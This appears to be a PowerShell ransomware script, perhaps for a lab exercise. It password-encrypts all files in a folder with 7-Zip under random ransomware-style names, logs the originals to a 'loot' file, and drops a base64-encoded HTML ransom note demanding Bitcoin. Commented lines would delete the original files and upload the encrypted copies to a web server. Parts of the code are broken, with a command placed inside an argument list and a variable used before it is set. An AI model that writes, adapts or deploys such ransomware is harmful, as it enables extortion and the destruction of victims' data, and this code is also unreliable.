# Set the folder path where your files are located
$folderPath = "C:\Temp\protect\test"

# Set the password for encryption
$password = "supersecretsaucepassword"

# Define the output folder for the encrypted files
$outputFolder = "C:\Temp\protect\output"

# Define the output folder for the encrypted files
$ransomFolder = "C:\Temp\protect\output"

# Set the output file for saving file paths and names
$lootFile = "C:\Temp\protect\loot.csv"

# Create the output folder if it doesn't exist
if (-not (Test-Path -Path $outputFolder)) {
    New-Item -Path $outputFolder -ItemType Directory
}

# Get the current date in the desired format (yyyyMMdd)
$date = Get-Date -Format "yyyyMMdd"

# Get the current date in the desired format (yyyyMMdd)
$nodename = "$Env:COMPUTERNAME"

# Iterate through all files in the specified folder
$files = Get-ChildItem -Path $folderPath

foreach ($file in $files) {
    # Define the output file with ".7z" extension
    #$outputFile = Join-Path -Path $outputFolder -ChildPath ($file.BaseName + ".7z")
    # Generate 12 random characters
    
    $fileHash = Get-FileHash $outputFile -Algorithm MD5
    $md5Hash = $fileHash.Hash

    $randomChars = -join(((65..90)+(35..38)+(97..122) | % {[char]$_})+(0..9) | Get-Random -Count 12)


    $outputFile = Join-Path -Path $outputFolder -ChildPath ("$randomChars-$date-$nodename-kayw0zkr3w.k3k")
    

    # Use 7z to encrypt the file with the provided password
    $args = @(
        "a",                # Add to archive
        #"h",                # hash all files
        "-mx=1",            # Maximum compression
        "-p$password",      # Set the password
        $outputFile,        # Output .7z file
        $file.FullName      # Input file

        # Append the file path and name to the output file
    Add-Content -Path $lootFile -Value "$file,$outputfile,$md5Hash"

    # You can also send the encrypted 7z files to your web server here using Invoke-RestMethod
    # Example:
    # Invoke-RestMethod -Uri $webServerUrl -Method Post -InFile "$outputFile"

    )

    & "C:\Program Files\7-Zip\7z.exe" $args
}

# remove all original files
#Remove-Item $files

# Notify when the process is complete

# set ransom note

# Base64-encoded string
$base64EncodedString = "PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8dGl0bGU+b2ggbjBlcyE8L3RpdGxlPgo8aGVhZD4KPC9oZWFkPgo8Ym9keSBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjpibGFjazsiPjxoMT5yYW5zMG13NHIzIG4wdGU8L2gxPgo8ZGl2Pgo8cCBzdHlsZT0iZm9udC1zaXplOjIwcHg7IGNvbG9yOiB3aGl0ZSI+CllvdXIgbmV0d29yayBoYXMgYmVlbiBwZW5ldHJhdGVkISBCeSB1cyEhITwvcD4mbmJzcDsKPHAgc3R5bGU9ImZvbnQtc2l6ZToyMHB4OyBjb2xvcjogd2hpdGUiPkFMTCBmaWxlcyBvbiBBTEwgbWFjaGluZXMgaW4geW91ciBuZXR3b3JrIGhhdmUgYmVlbiBlbmNyeXB0ZWQgd2l0aCBhIHN0cm9uZyBhbGdvcml0aG0gd2hpY2ggaXMgbm90IE1ENSwgaGFoYSE8L3A+CgogCiA8cCBzdHlsZT0iZm9udC1zaXplOjIwcHg7IGNvbG9yOiB3aGl0ZSI+V2UgaGF2ZSBleGNsdXNpdmUgcmlnaHRzIHRvIHRoZSBkZWNyeXB0aW9uIHNvZnR3YXJlLCBkbyB5b3Ugd2FudCBpdCBodWg/IFRoZW4gcGF5ITwvcD4KCgo8cCBzdHlsZT0iZm9udC1zaXplOjMwcHg7IGNvbG9yOiByZWQiPkRPIE5PIFJFU0VUIE9SIFNIVVRET1dOIE1BQ0hJTkVTLCBUSEUgTUFZIEJFIERBTUFHRUQgSUYgU0hVVERPV048L3A+Cgo8cCBzdHlsZT0iZm9udC1zaXplOjMwcHg7IGNvbG9yOiByZWQiPkRPIE5PVCBSRU5BTUUgT1IgTU9WRSBFTkNSWVBURUQgRklMRVMhPC9wPgoKPHAgc3R5bGU9ImZvbnQtc2l6ZTozMHB4OyBjb2xvcjogcmVkIj5ETyBOT1QgUkVWRVJTRSBFTkdJTkVFUiBUSEUgUkFOU09NV0FSRSwgSVQnUyBOT1QgQUxMT1dFRCE8L3A+Cgo8cCBzdHlsZT0iZm9udC1zaXplOjMwcHg7IGNvbG9yOiByZWQiPkRPIE5PVCBDQUxMIEJBVE1BTiwgSEUnUyBCVVNZIEVMU0VXSEVSRSE8L3A+CgoKPHAgc3R5bGU9ImZvbnQtc2l6ZToyMHB4OyBjb2xvcjogd2hpdGUiPlRvIGdldCBpbmZvIG9uIGhvdyB0byBkZWNyeXB0IHlvdXIgZmlsZXMsIGNvbnRhY3QgdXMgYXQgPC9wPgoKPHAgc3R5bGU9ImZvbnQtc2l6ZToyMHB4OyBjb2xvcjogbWFnZW50YSI+cDRuZDNtMWNwNG5kNEB0dXRhbm90YS5jb208L3A+LiAKCjxwIHN0eWxlPSJmb250LXNpemU6MjBweDsgY29sb3I6IHdoaXRlIj4oTm8sIHlvdSBjYW5ub3QgY2FsbCB1cywgdGhhdCB3b3VsZCBiZSB2ZXJ5IGV4cGVuc2l2ZSBhcyB3ZSBhcmUgbG9jYXRlZCBpbiBDaGluYS4pPC9wPgoKIDxwIHN0eWxlPSJmb250LXNpemU6MjBweDsgY29sb3I6IHdoaXRlIj5PdXIgQlRDIHdhbGxldDogPC9wPgo8cCBzdHlsZT0iZm9udC1zaXplOjIwcHg7IGNvbG9yOiBncmVlbiI+MTJ0OVlEUGd3dWVaOW55TWd3NTE5cDdhQUE4aXNqcjZTTXc8L3A+UmVnYXJkcywgcDRuZDQuCjxpbWcgc3JjPSJodHRwczovL2dpdGh1Yi5jb20va2F5d296L2thL2Jsb2IvbWFpbi9maWxlcy9wYW5kYS1tYXNjb3QtbG9nby1mcmVlLXZlY3Rvci5qcGc/cmF3PXRydWUiIHN0eWxlPSJ3aWR0aDo1MDBweDtoZWlnaHQ6NjAwcHg7Ij4KPC9kaXY+CjwvYm9keT4KPC9odG1sPg=="

# Decode the Base64-encoded string to bytes
$bytes = [System.Convert]::FromBase64String($base64EncodedString)

# Convert the bytes to a string (assuming it's a text-based content)
$decodedString = [System.Text.Encoding]::UTF8.GetString($bytes)

# Output the decoded string
 $ransomNote = Join-Path -Path $ransomFolder -ChildPath ("r4ns0mn0t3.html")
Add-Content -Value $decodedString -Path $ransomNote





Write-Host "File encryption complete."
